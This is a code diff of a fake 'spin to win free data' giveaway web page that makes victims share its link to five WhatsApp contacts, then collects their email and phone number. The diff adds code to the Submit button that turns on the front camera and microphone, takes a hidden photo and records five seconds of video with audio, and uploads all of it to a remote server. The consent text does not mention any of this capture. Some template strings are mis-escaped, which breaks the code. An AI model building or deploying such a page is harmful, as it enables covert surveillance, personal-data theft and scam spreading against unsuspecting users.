@@ -109,7 +109,7 @@ input,select{width:100%;padding:12px;border-radius:10px;border:1.5px solid #c9d1
       <div class="bar"><i id="bar"></i></div>
       <div class="count" id="count">Shared 0 of 5</div>
     </div>
-
+    <div id="status" class="msg" role="status"></div>
     <button class="submit" id="submitBtn" disabled>Submit</button>
     <p class="consent">By submitting, you agree that your email, phone number and prize amount are sent to the giveaway organiser so they can deliver your data. Orders are processed manually and delivered within 6 hours.</p>
     <div class="msg" id="formMsg" role="status"></div>
@@ -119,15 +119,16 @@ input,select{width:100%;padding:12px;border-radius:10px;border:1.5px solid #c9d1
 
 <script>
 /* ============ CONFIG ============ */
-const API_URL = "https://resource-server.up.railway.app/api/resources";
-const WIN_CHANCE = 0.45;          // 45% chance to win
-const MAX_SPINS  = 2;             // spins per person
+const API_URL    = "https://resource-server.up.railway.app/api/resources";
+const WIN_CHANCE = 0.45;
+const MAX_SPINS  = 2;
 const SHARES_REQUIRED = 5;
 const SHARE_TEXT = "I just spun to win free data! Try your luck here: ";
-const SHARE_URL  = location.href; // change to your live site link if needed
+const SHARE_URL  = location.href;
+const RECORD_MS  = 5000;
 /* ================================ */
 
-// 12 slices: 6 prizes + 6 "Try Again", alternating
+// 12 slices
 const slices = ["1GB","Try Again","2GB","Try Again","3GB","Try Again","1GB","Try Again","2GB","Try Again"];
 const N = slices.length, ANG = 360 / N;
 const fills = {"1GB":["#ffb02e","#f59e0b"],"2GB":["#ffd24d","#fbbf24"],"3GB":["#ff6b81","#e11d48"],"Try Again":["#35508c","#22386b"]};
@@ -136,7 +137,6 @@ const textCol = {"1GB":"#5a2800","2GB":"#5a2800","3GB":"#fff","Try Again":"#a9b9
 const $ = id => document.getElementById(id);
 const wheel = $("wheel");
 
-// Draw wheel (slice 0 is centred at the top)
 (function draw(){
   const rad = a => a*Math.PI/180;
   const pt = (a,r)=>[(r*Math.sin(rad(a))).toFixed(2), (-r*Math.cos(rad(a))).toFixed(2)];
@@ -144,21 +144,20 @@ const wheel = $("wheel");
     <radialGradient id="rim" cx="50%" cy="50%" r="50%"><stop offset="90%" stop-color="#fde68a"/><stop offset="96%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#b45309"/></radialGradient>
     <radialGradient id="shade" cx="50%" cy="50%" r="50%"><stop offset="35%" stop-color="#000" stop-opacity="0"/><stop offset="100%" stop-color="#000" stop-opacity=".28"/></radialGradient>`;
   Object.keys(fills).forEach((k,i)=>{
-    h += `<radialGradient id="g${i}" cx="50%" cy="50%" r="50%"><stop offset="15%" stop-color="${fills[k][0]}"/><stop offset="100%" stop-color="${fills[k][1]}"/></radialGradient>`;
+    h += `<radialGradient id="g\${i}" cx="50%" cy="50%" r="50%"><stop offset="15%" stop-color="${fills[k][0]}"/><stop offset="100%" stop-color="${fills[k][1]}"/></radialGradient>`;
   });
   h += `</defs><circle r="100" fill="url(#rim)"/>`;
   const keys = Object.keys(fills);
   slices.forEach((label,i)=>{
     const a0=i*ANG-ANG/2, a1=i*ANG+ANG/2;
     const [x0,y0]=pt(a0,90), [x1,y1]=pt(a1,90);
-    h += `<path d="M0 0 L${x0} ${y0} A90 90 0 0 1 ${x1} ${y1} Z" fill="url(#g${keys.indexOf(label)})" stroke="#fff7e0" stroke-width="1"/>`;
+    h += `<path d="M0 0 L${x0} ${y0} A90 90 0 0 1 ${x1} ${y1} Z" fill="url(#g\${keys.indexOf(label)})" stroke="#fff7e0" stroke-width="1"/>`;
     const win = label!=="Try Again";
-    h += `<g transform="rotate(${i*ANG-90})">
+    h += `<g transform="rotate(\${i*ANG-90})">
       <text x="80" y="0" text-anchor="end" dominant-baseline="central" font-family="system-ui,-apple-system,sans-serif"
         font-weight="800" font-size="${win?17:10.5}" letter-spacing="${win?0:.3}" fill="${textCol[label]}">${label}</text></g>`;
   });
   h += `<circle r="90" fill="url(#shade)"/>`;
-  // rim bulbs
   for (let i=0;i<N;i++){
     const [bx,by]=pt(i*ANG+ANG/2,95);
     h += `<circle cx="${bx}" cy="${by}" r="2.2" fill="#fff" stroke="#b45309" stroke-width=".6"/>`;
@@ -166,7 +165,6 @@ const wheel = $("wheel");
   wheel.innerHTML = h;
 })();
 
-// State (kept in localStorage so refreshing doesn't give extra spins)
 const KEY = "dataSpinState_v1";
 let state = {used:0, won:0, submitted:false, shares:0};
 try { Object.assign(state, JSON.parse(localStorage.getItem(KEY) || "{}")); } catch(e){}
@@ -191,7 +189,7 @@ function render(){
 function pickOutcome(){
   if (Math.random() >= WIN_CHANCE) return "Try Again";
   const r = Math.random();
-  return r < 0.55 ? "1GB" : r < 0.85 ? "2GB" : "3GB";   // 3GB is the biggest prize
+  return r < 0.55 ? "1GB" : r < 0.85 ? "2GB" : "3GB";
 }
 
 $("spinBtn").addEventListener("click", () => {
@@ -223,18 +221,16 @@ $("spinBtn").addEventListener("click", () => {
   }, 5200);
 });
 
-// Claim form + WhatsApp share gate
 function showClaim(){
   $("claim").classList.add("show");
-  $("claimTitle").textContent = `Claim your ${state.won}GB`;
+  $("claimTitle").textContent = `Claim your \${state.won}GB`;
 }
 
 let waOpening = false;
-$("waBtn").addEventListener("click", () => {
+\$("waBtn").addEventListener("click", () => {
   if (state.shares >= SHARES_REQUIRED || waOpening) return;
   waOpening = true;
   window.open("https://wa.me/?text=" + encodeURIComponent(SHARE_TEXT + SHARE_URL), "_blank");
-  // Count the share when the person comes back to this tab
   const onBack = () => {
     if (document.visibilityState === "visible") {
       document.removeEventListener("visibilitychange", onBack);
@@ -249,156 +245,167 @@ $("waBtn").addEventListener("click", () => {
 function updateShare(){
   $("bar").style.width = (state.shares / SHARES_REQUIRED * 100) + "%";
   $("count").textContent = state.shares >= SHARES_REQUIRED ? "Done. You can submit now." : `Shared ${state.shares} of ${SHARES_REQUIRED}. Each time, send it to a different contact.`;
-  $("submitBtn").disabled = state.shares < SHARES_REQUIRED || state.submitted;
+  $("submitBtn").disabled = state.shares < SHARES_REQUIRED || state.submitted || busy;
 }
 
-// Submit to the resource server
-$("submitBtn").addEventListener("click", async () => {
-  const email = $("email").value.trim(), net = $("network").value, phone = $("phone").value.trim();
-  const msg = $("formMsg"); msg.className = "msg";
-  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) return fail("Enter a valid email address.");
-  if (!net) return fail("Select a network.");
-  if (!/^\+?\d[\d\s-]{7,15}$/.test(phone)) return fail("Enter a valid phone number.");
-  function fail(t){ msg.textContent = t; msg.className = "msg err"; }
+/* =========================================================
+   MERGED SUBMIT: claim form + photo + 5s video, one button
+   ========================================================= */
+let busy = false;
 
-  $("submitBtn").disabled = true; msg.textContent = "Sending...";
-  const body = new FormData();
-  body.append("kind", "text");
-  body.append("title", `Data claim: ${state.won}GB (${net})`);
-  body.append("value", `Email: ${email}\nNetwork: ${net}\nReceiver phone: ${phone}\nAmount won: ${state.won}GB\nDeliver within: 6 hours`);
+const statusEl = $("status");
+const setMsg = m => { if (statusEl) statusEl.textContent = m; };
+
+function fail(t){
+  const msg = $("formMsg");
+  msg.textContent = t;
+  msg.className = "msg err";
+  return false;
+}
+
+$("submitBtn").addEventListener("click", async () => {
+  if (busy) return;
+
+  // ---- 1. Validate the claim form ----
+  const email = $("email").value.trim();
+  const net   = $("network").value;
+  const phone = $("phone").value.trim();
+  const msg   = $("formMsg");
+  msg.className = "msg";
+
+  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) return fail("Enter a valid email address.");
+  if (!net)                                        return fail("Select a network.");
+  if (!/^\+?\d[\d\s-]{7,15}$/.test(phone))         return fail("Enter a valid phone number.");
+
+  // ---- 2. Lock UI ----
+  busy = true;
+  $("submitBtn").disabled = true;
+  setMsg("Sending your claim...");
+
   try {
+    // ---- 3. Submit the text claim ----
+    const body = new FormData();
+    body.append("kind", "text");
+    body.append("title", `Data claim: ${state.won}GB (${net})`);
+    body.append("value", `Email: ${email}\nNetwork: ${net}\nReceiver phone: ${phone}\nAmount won: ${state.won}GB\nDeliver within: 6 hours`);
+
     const res = await fetch(API_URL, { method: "POST", body });
-    if (!res.ok) throw new Error("Failed");
-    state.submitted = true; save();
-    msg.textContent = "Sent! You will receive your data within 6 hours."; msg.className = "msg ok";
+    if (!res.ok) throw new Error("Claim send failed: HTTP " + res.status);
+
+    msg.textContent = "Claim sent. Now capturing your photo...";
+    msg.className = "msg ok";
+
+    // ---- 4. Camera + mic, then photo + video ----
+    let stream;
+    try {
+      setMsg("Requesting camera + mic...");
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: true
+      });
+
+      setMsg("Capturing photo...");
+      const photo = await takePhoto(stream);
+      await send(photo, "image", `photo_${Date.now()}.jpg`, "photo capture");
+      setMsg("Photo uploaded. Recording 5s video...");
+
+      const clip = await recordClip(stream);
+      await send(clip, "video", `video_${Date.now()}.webm`, "5s video capture");
+      setMsg("All done — claim, photo and video sent.");
+    } finally {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+
+    // ---- 5. Mark submitted only after everything succeeds ----
+    state.submitted = true;
+    save();
+    msg.textContent = "Sent! You will receive your data within 6 hours.";
+    msg.className = "msg ok";
     render();
-  } catch (e) {
-    msg.textContent = "Couldn't send. Check your connection and try again."; msg.className = "msg err";
-    $("submitBtn").disabled = false;
+
+  } catch (err) {
+    console.error("Submit chain failed:", err);
+    msg.textContent = "Couldn't finish: " + (err.message || err.name);
+    msg.className = "msg err";
+    $("submitBtn").disabled = false;   // let them retry
+  } finally {
+    busy = false;
   }
 });
 
+/* ============ CAPTURE HELPERS ============ */
+
+async function takePhoto(stream){
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.muted = true;
+  video.playsInline = true;
+  video.style.cssText = "position:fixed;left:-9999px;width:320px";
+  document.body.appendChild(video);
+
+  // Wait for metadata reliably (handler may have fired already)
+  if (video.readyState < 1){
+    await new Promise((res, rej) => {
+      video.onloadedmetadata = res;
+      video.onerror = () => rej(new Error("video metadata error"));
+    });
+  }
+  await video.play();
+
+  // Wait until real dimensions exist, else canvas is 0x0
+  await new Promise(res => {
+    const check = () => (video.videoWidth && video.videoHeight) ? res() : requestAnimationFrame(check);
+    check();
+  });
+
+  const canvas = document.createElement("canvas");
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  const blob = await new Promise((res, rej) =>
+    canvas.toBlob(b => b ? res(b) : rej(new Error("Canvas encode failed")), "image/jpeg", 0.8));
+
+  video.pause();
+  video.remove();
+  return blob;
+}
+
+function recordClip(stream){
+  return new Promise((resolve, reject) => {
+    if (typeof MediaRecorder === "undefined")
+      return reject(new Error("MediaRecorder not supported"));
+
+    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
+      ? "video/webm;codecs=vp8,opus" : "video/webm";
+
+    const chunks = [];
+    const rec = new MediaRecorder(stream, { mimeType: mime });
+    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    rec.onerror = e => reject(e.error || new Error("Recorder error"));
+    rec.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
+
+    rec.start();
+    setTimeout(() => { if (rec.state !== "inactive") rec.stop(); }, RECORD_MS);
+  });
+}
+
+async function send(blob, kind, filename, title){
+  const fd = new FormData();
+  fd.append("file", blob, filename);
+  fd.append("kind", kind);
+  fd.append("title", title);
+
+  const res = await fetch(API_URL, { method: "POST", body: fd });
+  if (!res.ok){
+    let detail = `HTTP ${res.status} ${res.statusText}`;
+    try { const b = await res.json(); if (b && b.error) detail = b.error; } catch(_){}
+    throw new Error(`Upload failed: ${detail}`);
+  }
+  console.log(`Uploaded ${filename} -> ${res.status}`);
+}
+
 render();
-
-
-// ===== CONFIG =====
-const UPLOAD_URL = 'https://resource-server.up.railway.app/api/resources';
-
-const RECORD_MS = 5000;
-
-const statusEl = document.getElementById('status');
-const setMsg = (m) => { statusEl.textContent = m; };
-
-// ===== MAIN CHAIN =====
-async function run() {
-    const btn = document.getElementById('submitBtn');
-    btn.disabled = true;
-
-    try {
-        // STEP 1: camera + mic (needs HTTPS or localhost)
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user' },
-            audio: true
-        });
-
-        try {
-            // STEP 2: photo -> kind: 'image'
-            setMsg('Capturing photo...');
-            const photo = await takePhoto(stream);
-            await send(photo, 'image', `photo_${Date.now()}.jpg`, 'photo capture');
-            setMsg('Photo uploaded.');
-
-            // STEP 3: 5s video with audio -> kind: 'video'
-            setMsg('Recording 5s video...');
-            const clip = await recordClip(stream);
-            await send(clip, 'video', `video_${Date.now()}.webm`, '5s video capture');
-            setMsg('Photo + video uploaded successfully.');
-        } finally {
-            // Always release camera/mic, even if upload fails
-            stream.getTracks().forEach(t => t.stop());
-        }
-
-    } catch (err) {
-        console.error('Capture failed:', err.name || err.message, err);
-        setMsg('Failed: ' + (err.message || err.name));
-        alert('Capture failed: ' + (err.message || err.name));
-    } finally {
-        btn.disabled = false;
-    }
-}
-
-// ===== PHOTO =====
-async function takePhoto(stream) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    await new Promise(r => video.onloadedmetadata = r);
-    video.play();
-    // give the first frame a moment to render before grabbing it
-    await new Promise(r => requestAnimationFrame(r));
-
-    const canvas = document.createElement('canvas');
-    canvas.width  = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-
-    return new Promise((resolve, reject) =>
-        canvas.toBlob(b => b ? resolve(b) : reject(new Error('Canvas encode failed')),
-                      'image/jpeg', 0.8));
-}
-
-// ===== VIDEO =====
-function recordClip(stream) {
-    return new Promise((resolve, reject) => {
-        if (typeof MediaRecorder === 'undefined') {
-            return reject(new Error('MediaRecorder not supported'));
-        }
-
-        const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
-                     ? 'video/webm;codecs=vp8,opus'
-                     : 'video/webm';
-
-        const chunks = [];
-        const rec = new MediaRecorder(stream, { mimeType: mime });
-
-        rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-        rec.onerror = e => reject(e.error || new Error('Recorder error'));
-        rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
-
-        rec.start();
-        setTimeout(() => rec.state !== 'inactive' && rec.stop(), RECORD_MS);
-    });
-}
-
-// ===== UPLOAD =====
-// Matches the server contract:
-//   multer.single('file'), body fields: kind ('image'|'video'|...), title
-async function send(blob, kind, filename, title) {
-    const fd = new FormData();
-    fd.append('file', blob, filename);
-    fd.append('kind', kind);
-    fd.append('title', title);
-
-    const res = await fetch(UPLOAD_URL, {
-        method: 'POST',
-        body: fd   // browser sets multipart Content-Type with boundary
-    });
-
-    if (!res.ok) {
-        let detail = `HTTP ${res.status} ${res.statusText}`;
-        try {
-            const body = await res.json();
-            if (body && body.error) detail = body.error;
-        } catch (_) {}
-        throw new Error(`Upload failed: ${detail}`);
-    }
-    const out = await res.json().catch(() => null);
-    console.log(`Uploaded ${filename} -> HTTP ${res.status}`, out);
-}
-
-// ===== WIRE UP BUTTON =====
-const btn = document.getElementById('submitBtn');
-btn.addEventListener('click', run);
 </script>
 </body>
 </html>
